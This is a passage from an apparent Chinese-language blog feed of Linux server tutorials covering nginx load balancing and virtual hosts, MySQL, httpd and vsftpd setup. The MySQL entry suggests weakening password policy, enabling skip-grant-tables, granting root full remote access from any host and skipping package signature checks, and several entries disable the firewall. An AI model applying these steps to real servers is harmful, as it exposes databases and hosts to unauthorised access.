192.168.200.132:8080     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">    server 192.168.200.132:8081     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">    server 192.168.200.132:8082     weight=1    max_fails=3    fail_timeout=10s;</span><br><span class="line">&#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  www.yjs21322.com;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">            proxy_pass http://tomcat;</span><br><span class="line">        &#125;</span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t 检查Nginx配置文件语法，出现successful即为成功</span><br><span class="line">systemctl restart nginx 重启Nginx</span><br></pre></td></tr></table></figure><blockquote>创建每个Tomcat的网站目录，在Tomcat目录下，创建名为app1的文件夹，三个Tomcat都是，然后用echo直接创建并编写index.jsp的内容。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27;&lt;%out.println(&quot;This is tomcat-1 yjs&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat/webapps/app1/index.jsp</span><br><span class="line"></span><br><span class="line">cd /usr/local/tomcat1/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27;&lt;%out.println(&quot;This is tomcat-2 213&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat1/webapps/app1/index.jsp</span><br><span class="line"></span><br><span class="line">cd /usr/local/tomcat2/webapps/</span><br><span class="line">mkdir app1</span><br><span class="line">echo &#x27; &lt;%out.println(&quot;This is tomcat-3 潘杰伦&quot;); %&gt;&#x27; &gt;  /usr/local/tomcat2/webapps/app1/index.jsp</span><br></pre></td></tr></table></figure><h2 id="映射域名并验证"><a href="#映射域名并验证" class="headerlink" title="映射域名并验证"></a>映射域名并验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在物理机C:\Windows\System32\drivers\etc目录改hosts文件</span><br><span class="line">映射192.168.200.132 www.yjs21322.com</span><br><span class="line">访问www.yjs21322.com/app1/</span><br><span class="line">即可看到轮询,验证了Tomcat的负载均衡</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装vim和net-tools&quot;&gt;&lt;a href=&quot;#安装vim和net-tools&quot; class=&quot;headerlink&quot; title=&quot;安装vim和net-tools&quot;&gt;&lt;/a&gt;安装vim和net-tools&lt;/h2&gt;&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>基于域名的虚拟主机的配置-nginx</title>
    <link href="https://jielunya.github.io/2022/12/12/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E9%85%8D%E7%BD%AE-nginx/"/>
    <id>https://jielunya.github.io/2022/12/12/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E9%85%8D%E7%BD%AE-nginx/</id>
    <published>2022-12-12T12:06:03.000Z</published>
    <updated>2022-12-12T12:27:03.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install nginx -y</span><br></pre></td></tr></table></figure><h2 id="进入已配置好的网站根目录-创建两个测试文件夹"><a href="#进入已配置好的网站根目录-创建两个测试文件夹" class="headerlink" title="进入已配置好的网站根目录,创建两个测试文件夹"></a>进入已配置好的网站根目录,创建两个测试文件夹</h2><blockquote>文件夹中用于存放测试网站信息，即存放项目代码。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html</span><br><span class="line">mkdir Testpage-1</span><br><span class="line">mkdir Testpage-2</span><br></pre></td></tr></table></figure><h2 id="创建并编辑index-html文件"><a href="#创建并编辑index-html文件" class="headerlink" title="创建并编辑index.html文件"></a>创建并编辑index.html文件</h2><blockquote>index.html为将要显示的页面，同样可以把网站项目直接放在/usr/share/nginx/html/目录下，直接使用</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html/Testpage-1/</span><br><span class="line">vim index.html</span><br><span class="line">按i进入编辑模式，输入以下测试内容。</span><br><span class="line">Test page 1</span><br><span class="line">:wq!保存</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/nginx/html/Testpage-2/</span><br><span class="line">vim index.html</span><br><span class="line">按i进入编辑模式，输入以下测试内容。</span><br><span class="line">Test page 2</span><br><span class="line">:wq!保存</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">运行以下命令查看nginx.conf配置文件。</span><br><span class="line">cat /etc/nginx/nginx.conf</span><br><span class="line">其中include /etc/nginx/conf.d/*.conf;表示Nginx将会从该路径下的所有.conf文件获取站点信息。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为测试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">运行以下命令进入/etc/nginx/conf.d路径下</span><br><span class="line">cd /etc/nginx/conf.d</span><br><span class="line">为试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">vim Testpage1.conf</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">按i进入编辑模式，输入以下内容。</span><br><span class="line">在注释内容处，替换服务器域名参数信息与项目路径参数信息。</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  testpage1.com;    #此处使用测试域名。实际配置中使用您的服务器域名。</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    access_log  /var/log/nginx/b.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html/Testpage-1;    #测试站点路径。即您的项目代码路径。</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为测试站点Testpage-2创建并配置Nginx配置文件。</span><br><span class="line">运行以下命令进入/etc/nginx/conf.d路径下</span><br><span class="line">cd /etc/nginx/conf.d</span><br><span class="line">为试站点Testpage-1创建并配置Nginx配置文件。</span><br><span class="line">vim Testpage2.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.按i进入编辑模式，输入以下内容。</span><br><span class="line">在注释内容处，替换服务器域名参数信息与项目路径参数信息。</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  testpage2.com;    #此处使用测试域名。实际配置中使用您的服务器域名。</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    access_log  /var/log/nginx/b.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html/Testpage-2;    #测试站点路径。即您的项目代码路径。</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重启Nginx服务"><a href="#重启Nginx服务" class="headerlink" title="重启Nginx服务"></a>重启Nginx服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><h2 id="本地配置hosts-配置了，可以以域名方式访问"><a href="#本地配置hosts-配置了，可以以域名方式访问" class="headerlink" title="本地配置hosts(配置了，可以以域名方式访问)"></a>本地配置hosts(配置了，可以以域名方式访问)</h2><blockquote>1.访问C:\Windows\System32\drivers\etc目录。2.复制hosts文件进行备份。保留hosts - 副本文件，在测试完成后使用该文件恢复hosts文件的初始状态。3.修改hosts文件。在文件末尾追加以下内容。IP地址 testpage1.comIP地址 testpage2.com保存文件并退出。4.返回Windows桌面，并按下Win + R组合键。5.在运行对话框中输入cmd，并单击确定。6.在命令行中运行以下命令，使hosts配置立即生效。ipconfig /flushdns在本地主机打开浏览器，成功访问到两个测试站点。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装Nginx&quot;&gt;&lt;a href=&quot;#安装Nginx&quot; class=&quot;headerlink&quot; title=&quot;安装Nginx&quot;&gt;&lt;/a&gt;安装Nginx&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建Nginx服务</title>
    <link href="https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BAnginx/"/>
    <id>https://jielunya.github.io/2022/12/12/%E6%90%AD%E5%BB%BAnginx/</id>
    <published>2022-12-12T11:57:03.000Z</published>
    <updated>2022-12-12T12:05:27.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="yum安装nginx"><a href="#yum安装nginx" class="headerlink" title="yum安装nginx"></a>yum安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install nginx -y</span><br></pre></td></tr></table></figure><h2 id="查看nginx版本"><a href="#查看nginx版本" class="headerlink" title="查看nginx版本"></a>查看nginx版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -version</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><h2 id="修改Nginx默认页面内容，浏览器访问ip"><a href="#修改Nginx默认页面内容，浏览器访问ip" class="headerlink" title="修改Nginx默认页面内容，浏览器访问ip"></a>修改Nginx默认页面内容，浏览器访问ip</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure><blockquote>可以添加修改<h1>Welcome to nginx!</h1>的内容，比如将Welcome to nginx!改为yjs213-22</blockquote><blockquote>也可以将index.html内容全部删除，直接添加自己想要的文字</blockquote><blockquote>也可以将网站源代码直接拉到/usr/share/nginx/html目录下，访问即可拥有做好的网站项目</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;yum安装nginx&quot;&gt;&lt;a href=&quot;#yum安装nginx&quot; class=&quot;headerlink&quot; title=&quot;yum安装nginx&quot;&gt;&lt;/a&gt;yum安装nginx&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建并配置Mysql服务</title>
    <link href="https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BA%E5%B9%B6%E9%85%8D%E7%BD%AEMysql%E6%9C%8D%E5%8A%A1/"/>
    <id>https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BA%E5%B9%B6%E9%85%8D%E7%BD%AEMysql%E6%9C%8D%E5%8A%A1/</id>
    <published>2022-12-11T15:04:03.000Z</published>
    <updated>2022-12-12T11:56:18.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检查是否已经安装Mysql，如未安装则执行下面命令为空。"><a href="#检查是否已经安装Mysql，如未安装则执行下面命令为空。" class="headerlink" title="检查是否已经安装Mysql，如未安装则执行下面命令为空。"></a>检查是否已经安装Mysql，如未安装则执行下面命令为空。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa |grep -i mysql</span><br></pre></td></tr></table></figure><h3 id="如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。"><a href="#如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。" class="headerlink" title="如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。"></a>如果不为空，则使用以下命令，进行删除安装过的包，删除相关服务，找出残余文件并删除。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -e 对应文件名</span><br><span class="line">chkconfig --list | grep -i mysql</span><br><span class="line">chkconfig --del mysql</span><br><span class="line">find / -name mysql</span><br><span class="line">rm -rf 对应文件路径</span><br></pre></td></tr></table></figure><h2 id="可能系统自带了Mariadb数据库，要先卸载。"><a href="#可能系统自带了Mariadb数据库，要先卸载。" class="headerlink" title="可能系统自带了Mariadb数据库，要先卸载。"></a>可能系统自带了Mariadb数据库，要先卸载。</h2><p>查询是否自带Mariadb数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa |grep Mariadb</span><br></pre></td></tr></table></figure><blockquote>有的话执行rpm -e --nodeps 对应软件包名字</blockquote><blockquote>我这里是rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64</blockquote><h2 id="下载Mysql源到服务器（一般可从这里开始，以上可忽略。）"><a href="#下载Mysql源到服务器（一般可从这里开始，以上可忽略。）" class="headerlink" title="下载Mysql源到服务器（一般可从这里开始，以上可忽略。）"></a>下载Mysql源到服务器（一般可从这里开始，以上可忽略。）</h2><blockquote>Mysql源地址：https://repo.mysql.com</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm</span><br></pre></td></tr></table></figure><p>此处地址是由<a href="https://repo.mysql.com/">https://repo.mysql.com</a> 加上&#x2F;&#x2F;再接上对应rpm文件名得出。</p><h2 id="安装Mysql的yum源"><a href="#安装Mysql的yum源" class="headerlink" title="安装Mysql的yum源"></a>安装Mysql的yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh mysql80-community-release-el7-3.noarch.rpm</span><br></pre></td></tr></table></figure><blockquote>执行yum makecache可查看到已安装的yum源</blockquote><h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><blockquote>这里的nogpgcheck是跳过检查公钥安装，否则可能安装不了。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mysql-community-server --nogpgcheck -y</span><br></pre></td></tr></table></figure><h2 id="查看版本号，启动Mysql设置开机启动并查看状态"><a href="#查看版本号，启动Mysql设置开机启动并查看状态" class="headerlink" title="查看版本号，启动Mysql设置开机启动并查看状态"></a>查看版本号，启动Mysql设置开机启动并查看状态</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -v</span><br><span class="line">systemctl start mysqld</span><br><span class="line">systemctl enable mysqld</span><br><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure><h2 id="查看随机生成的密码"><a href="#查看随机生成的密码" class="headerlink" title="查看随机生成的密码"></a>查看随机生成的密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;password&quot; /var/log/mysqld.log</span><br></pre></td></tr></table></figure><h2 id="以root身份进入Mysql"><a href="#以root身份进入Mysql" class="headerlink" title="以root身份进入Mysql"></a>以root身份进入Mysql</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">输入刚刚获取到的密码即可进入</span><br></pre></td></tr></table></figure><h2 id="修改root的Mysql密码"><a href="#修改root的Mysql密码" class="headerlink" title="修改root的Mysql密码"></a>修改root的Mysql密码</h2><blockquote>密码要求大写字母＋小写字母＋数字＋特殊字符，长度不能小于8位</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password BY &#x27;Lun5201314..&#x27;;</span><br></pre></td></tr></table></figure><h2 id="可以将密码修改为简单模式，方便操作-非必要"><a href="#可以将密码修改为简单模式，方便操作-非必要" class="headerlink" title="可以将密码修改为简单模式，方便操作(非必要)"></a>可以将密码修改为简单模式，方便操作(非必要)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置为弱口令,密码最小长度为1</span><br><span class="line">mysql&gt; set global validate_password.policy=0;</span><br><span class="line">mysql&gt; set global validate_password.length=1;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">#查看密码策略</span><br><span class="line">mysql&gt; show variables like &#x27;%validate_password_policy%&#x27;;</span><br><span class="line">mysql&gt; show variables like &#x27;%validate_password_length%&#x27;;</span><br></pre></td></tr></table></figure><h2 id="可以设置免密登录-非必要"><a href="#可以设置免密登录-非必要" class="headerlink" title="可以设置免密登录(非必要)"></a>可以设置免密登录(非必要)</h2><blockquote>修改/etc/my.cnf文件</blockquote><blockquote>把skip-grant-tables添加到配置文件里面，放在[mysqld]下面就可以了</blockquote><blockquote>重启服务systemctl restart mysqld</blockquote><h2 id="可以对Mysql进行安全性配置-非必要"><a href="#可以对Mysql进行安全性配置-非必要" class="headerlink" title="可以对Mysql进行安全性配置(非必要)"></a>可以对Mysql进行安全性配置(非必要)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><blockquote>重置root用户的密码。<p>说明:在输入密码时，系统为了最大限度的保证数据安全，命令行将不做任何回显。您只需要输入正确的密码信息，然后按Enter键即可。<br>Enter password for user root: #输入已获取的root用户初始密码</p><p>The existing password for the user account root has expired. Please set a new password.</p><p>New password: #输入新的MySQL密码</p><p>Re-enter new password: #重复输入新的MySQL密码<br>The ‘validate_password’ component is installed on the server.<br>The subsequent steps will run with the existing configuration<br>of the component.<br>Using existing password for root.<br>Change the password for root ? ((Press y|Y for Yes, any other key for No) :Y #输入Y选择更新MySQL密码。您也可以输入N不再更新MySQL密码。</p><p>New password: #输入新的MySQL密码</p><p>Re-enter new password: #重复输入新的MySQL密码</p><p>Estimated strength of the password: 100<br>Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) :Y #输入Y确认使用已设置的密码。<br>b.删除匿名用户。<br>c.By default, a MySQL installation has an anonymous user,<br>d.allowing anyone to log into MySQL without having to have<br>e.a user account created for them. This is intended only for<br>f.testing, and to make the installation go a bit smoother.<br>g.You should remove them before moving into a production<br>h.environment.<br>i.<br>j.Remove anonymous users? (Press y|Y for Yes, any other key for No) :Y #输入Y删除MySQL默认的匿名用户。<br>Success.<br>k.禁止root账号远程登录。<br>l.Normally, root should only be allowed to connect from<br>m.‘localhost’. This ensures that someone cannot guess at<br>n.the root password from the network.<br>o.<br>p.Disallow root login remotely? (Press y|Y for Yes, any other key for No) :Y #输入Y禁止root远程登录。<br>Success.<br>q.删除test库以及对test库的访问权限。<br>r.By default, MySQL comes with a database named ‘test’ that<br>s.anyone can access. This is also intended only for testing,<br>t.and should be removed before moving into a production<br>u.environment.<br>v.<br>w.<br>x.Remove test database and access to it? (Press y|Y for Yes, any other key for No) :Y #输入Y删除test库以及对test库的访问权限。<br>y. - Dropping test database…<br>z.Success.<br>aa.<br>bb. - Removing privileges on test database…<br>Success.<br>cc.重新加载授权表。<br>dd.Reloading the privilege tables will ensure that all changes<br>ee.made so far will take effect immediately.<br>ff.<br>gg.Reload privilege tables now? (Press y|Y for Yes, any other key for No) :Y #输入Y重新加载授权表。<br>hh.Success.<br>ii.<br>All done!</p></blockquote><h2 id="开启远程连接"><a href="#开启远程连接" class="headerlink" title="开启远程连接"></a>开启远程连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set host =&#x27;%&#x27; where user =&#x27;root&#x27;</span><br></pre></td></tr></table></figure><h2 id="给root用户授权"><a href="#给root用户授权" class="headerlink" title="给root用户授权"></a>给root用户授权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all privileges on *.* to root@&#x27;%&#x27; with grant option;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><h2 id="创建远程登录MySQL的账号"><a href="#创建远程登录MySQL的账号" class="headerlink" title="创建远程登录MySQL的账号"></a>创建远程登录MySQL的账号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建数据库用户2021232203322,并授予远程连接权限</span><br><span class="line">mysql&gt; create user &#x27;2021232203322&#x27;@&#x27;%&#x27; identified by &#x27;Lun5201314..&#x27;; </span><br><span class="line">#为2021232203322用户授权数据库所有权限</span><br><span class="line">mysql&gt; grant all privileges on *.* to &#x27;2021232203322&#x27;@&#x27;%&#x27;; </span><br><span class="line">#刷新权限</span><br><span class="line">mysql&gt; flush privileges; </span><br></pre></td></tr></table></figure><h2 id="CMD-窗口连接使用"><a href="#CMD-窗口连接使用" class="headerlink" title="CMD 窗口连接使用"></a>CMD 窗口连接使用</h2><blockquote>cmd命令行输入mysql -h ip地址 -P 3306 -u 用户名 -p需要关闭防火墙:systemctl stop firewalld<p>如果提示’mysql’ 不是内部或外部命令，也不是可运行的程序,则复制mysql的安装路径bin目录<br>我这里是：C:\Program Files\MySQL\MySQL Server 5.5\bin<br>右击我的电脑-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量-&gt;系统变量-&gt;双击Path-&gt;新建-&gt;把刚刚的目录复制进去-&gt;确定-&gt;外面还有一个确定</p></blockquote><h2 id="Navicat-远程连接使用："><a href="#Navicat-远程连接使用：" class="headerlink" title="Navicat 远程连接使用："></a>Navicat 远程连接使用：</h2><blockquote>连接名随便写，主机：写ip地址，端口3306，用户名为root（前面如果设置了禁止root远程登录则会登陆失败），或者创建的用户，密码为自己设置的密码,同样需要关闭防火墙:systemctl stop firewalld</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot;&gt;&lt;a href=&quot;#检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot; class=&quot;headerlink&quot; title=&quot;检查是否已经安装Mysql，如未安装则执行下面命令为空。&quot;&gt;&lt;/a&gt;检查</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搭建web服务</title>
    <link href="https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://jielunya.github.io/2022/12/11/%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2022-12-11T14:51:03.000Z</published>
    <updated>2022-12-11T15:09:24.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装httpd服务"><a href="#安装httpd服务" class="headerlink" title="安装httpd服务"></a>安装httpd服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install httpd</span><br><span class="line">systemctl enable httpd</span><br><span class="line">vim /var/www/html/index.html</span><br></pre></td></tr></table></figure><blockquote>往index.html里面写内容</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><blockquote>浏览器输入ip地址，即可显示自己制作的index.html页面。</blockquote><blockquote>将网站源码下载放到/var/www/html，即可显示制作好的网页内容。</blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装httpd服务&quot;&gt;&lt;a href=&quot;#安装httpd服务&quot; class=&quot;headerlink&quot; title=&quot;安装httpd服务&quot;&gt;&lt;/a&gt;安装httpd服务&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>FTP配置-本地用户</title>
    <link href="https://jielunya.github.io/2022/12/09/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/"/>
    <id>https://jielunya.github.io/2022/12/09/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/</id>
    <published>2022-12-09T07:01:39.277Z</published>
    <updated>2022-12-09T07:33:49.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y vsftpd</span><br><span class="line">systemctl enable vsftpd.service</span><br><span class="line">systemctl start vsftpd.service</span><br><span class="line">netstat -antup | grep ftp</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/1.png"></p><h2 id="添加FTP用户并修改密码"><a href="#添加FTP用户并修改密码" class="headerlink" title="添加FTP用户并修改密码"></a>添加FTP用户并修改密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# adduser ftp22</span><br><span class="line">[root@localhost ~]# passwd ftp22</span><br></pre></td></tr></table></figure><p><img src="/FTP%E9%85%8D%E7%BD%AE-%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7/2.png"></p><h2 id="为FTP用户创建文件夹及文件"><a href="#为FTP用户创建文件夹及文件" class="headerlink" title="为FTP用户创建文件夹及文件"></a>为FTP用户创建文件夹及文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir /var/ftp/22</span><br><span class="line">[root@localhost ~]# touch /var/ftp/22/22.txt</span><br></pre></td></tr></table></figure><h2 id="将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户"><a href="#将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户" class="headerlink" title="将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户"></a>将目录以及其子目录下的所有文件归属者改成需要设置给予权限的用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# chown -R ftp22:ftp22 /var/ftp/22</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl disabled firewalld</span><br></pre></td></tr></table></figure><h2 id="配置vsftpd-conf文件"><a href="#配置vsftpd-conf文件" class="headerlink" title="配置vsftpd.conf文件"></a>配置vsftpd.conf文件</h2><blockquote>vsftpd.conf里面主要包括安全配置，传输，用户还有权限等相关的选项</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure><blockquote>除下面提及的参数，其他参数保持默认值即可。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#修改下列参数的值：</span><br><span class="line">#禁止匿名登录FTP服务器。</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#允许本地用户登录FTP服务器。</span><br><span class="line">local_enable=YES</span><br><span class="line">#监听IPv4 sockets。</span><br><span class="line">listen=YES</span><br><span class="line"></span><br><span class="line">#在行首添加#注释掉以下参数：</span><br><span class="line">#关闭监听IPv6 sockets。</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">#设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/22</span><br><span class="line">#全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">#启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">#指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">#本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=&lt;FTP服务器公网IP地址&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=50000</span><br><span 